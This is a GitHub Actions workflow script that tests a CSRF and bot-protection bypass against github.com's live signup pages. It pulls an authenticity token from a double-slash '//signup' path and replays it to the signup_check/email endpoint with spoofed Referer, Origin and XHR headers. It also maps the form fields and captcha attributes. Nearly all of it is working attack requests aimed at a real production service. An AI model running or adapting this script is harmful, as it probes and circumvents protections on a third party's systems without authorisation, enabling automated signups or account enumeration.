name: Test CSRF Path Binding
on:
  workflow_dispatch:

jobs:
  test-csrf:
    runs-on: ubuntu-latest
    steps:
      - name: Test CSRF path binding bypass
        run: |
          set +e
          echo "=== Step 1: Get CSRF from //signup ==="
          RESPONSE=$(curl -s -c /tmp/cookies.txt https://github.com//signup)
          CSRF=$(echo "$RESPONSE" | grep -oP 'name="authenticity_token" value="\K[^"]+' | head -1)
          echo "CSRF token from //signup: ${CSRF:0:30}..."
          echo "Cookies:"
          cat /tmp/cookies.txt
          echo
          
          echo "=== Step 2: POST //signup_check/email (double-slash) ==="
          curl -s -b /tmp/cookies.txt -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
            "https://github.com//signup_check/email" \
            -o /tmp/check_ds.txt -w "HTTP Status: %{http_code}\n" -D /tmp/check_ds_headers.txt
          echo "Response headers:"
          cat /tmp/check_ds_headers.txt | head -10
          echo "Response body:"
          cat /tmp/check_ds.txt | head -c 500
          echo
          echo
          
          echo "=== Step 3: POST /signup_check/email (single-slash, for comparison) ==="
          curl -s -b /tmp/cookies.txt -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
            "https://github.com/signup_check/email" \
            -o /tmp/check_ss.txt -w "HTTP Status: %{http_code}\n"
          echo "Response body:"
          cat /tmp/check_ss.txt | head -c 500
          echo
          echo

          echo "=== Step 4: GET /signup to get CSRF from normal path ==="
          curl -s -c /tmp/cookies2.txt "https://github.com/signup" -o /tmp/signup_normal.txt -w "HTTP Status: %{http_code}\n"
          CSRF2=$(grep -oP 'name="authenticity_token" value="\K[^"]+' /tmp/signup_normal.txt | head -1)
          echo "CSRF token from /signup: ${CSRF2:0:30}..."
          echo "(This path returns 403/DataDome so no CSRF expected)"
          echo

          echo "=== Step 5: Test signup_check with XHR-like headers ==="
          curl -s -b /tmp/cookies.txt -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            -H "X-Requested-With: XMLHttpRequest" \
            -H "Referer: https://github.com/signup" \
            -H "Origin: https://github.com" \
            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
            "https://github.com/signup_check/email" \
            -o /tmp/check_xhr.txt -w "HTTP Status: %{http_code}\n"
          echo "Response body:"
          cat /tmp/check_xhr.txt | head -c 500
          echo
          echo

          echo "=== Step 6: Test with Referer matching /signup ==="
          curl -s -b /tmp/cookies.txt -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            -H "Referer: https://github.com//signup" \
            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
            "https://github.com//signup_check/email" \
            -o /tmp/check_ref.txt -w "HTTP Status: %{http_code}\n"
          echo "Response body:"  
          cat /tmp/check_ref.txt | head -c 500
          echo
          echo
          
          echo "=== Step 7: Test GET /signup page to see if CSRF is embedded ==="
          echo "Checking //signup page structure for JS-based token extraction"
          echo "Signup form fields:"
          echo "$RESPONSE" | grep -oP 'name="[^"]*"' | sort -u | head -20
          echo
          echo "Octocaptcha attributes:"
          echo "$RESPONSE" | grep -o 'data-octocaptcha[^>]*' | head -5
          echo
          echo "Form actions:"
          echo "$RESPONSE" | grep -oP 'action="\K[^"]*' | head -10
